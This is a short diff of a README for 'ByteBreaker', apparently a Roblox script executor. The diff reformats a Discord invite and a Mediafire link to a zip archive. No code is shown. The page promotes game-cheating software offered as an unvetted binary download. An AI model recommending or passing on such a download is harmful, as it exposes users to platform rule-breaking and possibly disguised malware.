@@ -1,8 +1,9 @@
 <h1 align="center">ByteBreaker - Roblox Executor</h1>
 
-**Trillium INC: https://discord.gg/vzXzFpv2gk** <br/>
+**Trillium INC: https://discord.gg/vzXzFpv2gk**
+
 **Download: https://www.mediafire.com/file/7z6ip1zs69ib6wf/ByteBreaker.zip/file** <br/>
-Download on Mediafire because this sh1 is too big for GitHub
+*Download on Mediafire because this sh1 is too big for GitHub*
 
 # Why?
 
